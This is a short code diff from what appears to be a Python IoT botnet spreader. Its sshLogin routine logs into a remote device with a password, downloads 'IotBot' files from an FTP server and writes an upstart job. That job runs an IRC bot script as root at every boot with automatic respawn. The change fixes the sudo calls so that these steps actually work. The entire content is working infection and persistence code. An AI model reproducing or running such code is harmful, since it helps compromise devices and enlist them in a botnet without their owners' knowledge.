@@ -39,20 +39,20 @@ def sshLogin(user, ip, password):
         cd kabali 
         echo ''' + password + '''| sudo -S mkdir IotBot
         cd IotBot
-        echo ''' + password + '''| sudo wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
+        echo ''' + password + '''| sudo -S wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
         
-        echo ''' + password + '''| sudo touch /etc/init/my.conf
+        echo ''' + password + '''| sudo -S touch /etc/init/my.conf
         
-        echo ''' + password + '''| sudo echo 'start on runlevel [234]' >> /etc/init/my.conf
-        echo ''' + password + '''| sudo echo 'stop on runlevel [0156]' >> /etc/init/my.conf
-        echo ''' + password + '''| sudo echo '' >> /etc/init/my.conf
+        echo ''' + password + '''| sudo -S echo 'start on runlevel [234]' >> /etc/init/my.conf
+        echo ''' + password + '''| sudo -S echo 'stop on runlevel [0156]' >> /etc/init/my.conf
+        echo ''' + password + '''| sudo -S echo '' >> /etc/init/my.conf
         
-        echo ''' + password + '''| sudo echo 'exec /usr/bin/python3 /home/kabali/IotBot/irc_bot.py' >> /etc/init/my.conf
+        echo ''' + password + '''| sudo -S echo 'exec /usr/bin/python3 /home/kabali/IotBot/irc_bot.py' >> /etc/init/my.conf
         
-        echo ''' + password + '''| sudo echo 'respawn' >> /etc/init/my.conf
+        echo ''' + password + '''| sudo -S echo 'respawn' >> /etc/init/my.conf
 
-        echo ''' + password + '''| sudo start my
-        echo ''' + password + '''| sudo status my 
+        echo ''' + password + '''| sudo -S start my
+        echo ''' + password + '''| sudo -S status my 
         exit
         '''
         )
